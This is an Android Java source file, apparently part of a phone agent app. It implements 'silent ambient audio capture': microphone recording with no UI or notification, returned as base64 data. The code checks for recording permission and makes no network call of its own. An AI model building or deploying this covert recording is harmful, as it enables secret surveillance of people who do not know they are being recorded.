package com.hermescoagent.phone;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.media.MediaRecorder;
import android.os.Build;
import android.util.Base64;

import org.json.JSONObject;

import java.io.File;
import java.io.FileInputStream;

/**
 * Silent ambient audio capture via MediaRecorder (mic → AAC-in-MP4).
 * No UI, no notification. Returns file path and base64-encoded bytes.
 */
public final class AudioCapture {

    private AudioCapture() {}

    private static final int MIN_SECONDS = 1;
    private static final int MAX_SECONDS = 30;

    public static JSONObject record(Context ctx, int seconds) {
        JSONObject resp = new JSONObject();
        int secs = Math.max(MIN_SECONDS, Math.min(MAX_SECONDS, seconds));
        try {
            resp.put("seconds", secs);
            if (ctx.checkSelfPermission(Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
                resp.put("ok", false);
                resp.put("error", "record_audio permission not granted");
                return resp;
            }
            File dir = new File(ctx.getCacheDir(), "audio");
            //noinspection ResultOfMethodCallIgnored
            dir.mkdirs();
            // Purge previous recordings so the cache doesn't accumulate
            // (potential exposure via backup or root); base64 is in the response.
            File[] existing = dir.listFiles();
            if (existing != null) {
                for (File f : existing) {
                    //noinspection ResultOfMethodCallIgnored
                    f.delete();
                }
            }
            File out = new File(dir, "rec-" + System.currentTimeMillis() + ".m4a");

            MediaRecorder mr = Build.VERSION.SDK_INT >= Build.VERSION_CODES.S
                    ? new MediaRecorder(ctx)
                    : new MediaRecorder();
            try {
                mr.setAudioSource(MediaRecorder.AudioSource.MIC);
                mr.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
                mr.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
                mr.setAudioEncodingBitRate(64_000);
                mr.setAudioSamplingRate(44_100);
                mr.setOutputFile(out.getAbsolutePath());
                mr.prepare();
                mr.start();
                try { Thread.sleep(secs * 1000L); }
                catch (InterruptedException ie) { Thread.currentThread().interrupt(); }
                try { mr.stop(); } catch (Throwable ignored) {}
            } catch (Exception e) {
                try { mr.reset(); } catch (Throwable ignored) {}
                try { mr.release(); } catch (Throwable ignored) {}
                resp.put("ok", false);
                resp.put("error", "recorder: " + e);
                return resp;
            }
            try { mr.release(); } catch (Throwable ignored) {}

            if (!out.exists() || out.length() == 0) {
                resp.put("ok", false);
                resp.put("error", "no audio captured");
                return resp;
            }

            long len = out.length();
            byte[] buf = new byte[(int) len];
            try (FileInputStream fis = new FileInputStream(out)) {
                int off = 0;
                while (off < buf.length) {
                    int r = fis.read(buf, off, buf.length - off);
                    if (r == -1) break;
                    off += r;
                }
            }

            resp.put("ok", true);
            resp.put("path", out.getAbsolutePath());
            resp.put("bytes", len);
            resp.put("base64", Base64.encodeToString(buf, Base64.NO_WRAP));
            return resp;
        } catch (Exception e) {
            try { resp.put("ok", false); resp.put("error", String.valueOf(e)); } catch (Exception ignored) {}
            return resp;
        }
    }
}
